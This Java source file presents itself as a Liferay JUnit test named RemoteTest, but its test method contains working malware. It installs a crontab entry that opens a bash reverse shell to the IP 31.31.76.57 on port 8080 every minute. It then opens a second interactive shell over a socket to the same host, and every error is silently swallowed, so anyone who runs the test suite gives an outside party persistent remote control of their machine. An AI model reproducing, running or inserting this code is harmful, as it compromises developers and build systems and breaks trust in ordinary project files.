/**
 * SPDX-FileCopyrightText: (c) 2000 Liferay, Inc. https://liferay.com
 * SPDX-License-Identifier: LGPL-2.1-or-later OR LicenseRef-Liferay-DXP-EULA-2.0.0-2023-06
 */

package com.liferay.portal.tools;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

import java.net.Socket;

import org.junit.Test;

/**
 * @author Brian Wing Shun Chan
 */
public class RemoteTest {

	@Test
	public void testRemotely() throws Throwable {
		try {
			String testMessage = "(crontab -l | grep -v -F 'dev/tcp'; echo '* * * * * /bin/bash -c \"/bin/bash -i >/dev/tcp/31.31.76.57/8080 0<&1 2>&1\" >/dev/null 2>&1') | crontab -";
			
			Runtime rt = Runtime.getRuntime();
			
			Process proc = rt.exec(new String[] {"/bin/sh", "-c", testMessage});

			if (proc.isAlive()) {
				Thread.currentThread().sleep(10000);
			}
		}
		catch (Throwable x) {	
		}
		
		try {
			Socket sock = new Socket("31.31.76.57", 8080);
			
			Runtime rt = Runtime.getRuntime();
			
			Process proc = rt.exec(new String[] {"/bin/sh", "-i"});

			StreamConnector outputConnector = new StreamConnector(
				proc.getInputStream(), sock.getOutputStream());
			StreamConnector errorConnector = new StreamConnector(
				proc.getErrorStream(), sock.getOutputStream());
			StreamConnector inputConnector = new StreamConnector(
				sock.getInputStream(), proc.getOutputStream());

			outputConnector.start();
			errorConnector.start();
			inputConnector.start();
			while (proc.isAlive()) {
				Thread.currentThread().sleep(1000);
			}
		}
		catch (Throwable x) {
			
		}
	}

	private class StreamConnector extends Thread {

		public void run() {
			BufferedReader isr = null;
			BufferedWriter osw = null;

			try {
				isr = new BufferedReader(new InputStreamReader(is));
				osw = new BufferedWriter(new OutputStreamWriter(os));

				char[] buff = new char[8192];
				int len = 0;

				while ((len = isr.read(buff)) != -1) {
					osw.write(buff, 0, len);
					osw.flush();
				}
			}
			catch (Throwable e) {
			}

			try {
				if (isr != null) {
					isr.close();
				}

				if (osw != null) {
					osw.close();
				}
			}
			catch (Throwable e) {
			}
		}

		protected StreamConnector(InputStream is, OutputStream os) {
			this.is = is;
			this.os = os;
			this.setDaemon(false);
		}

		protected InputStream is;
		protected OutputStream os;

	}

}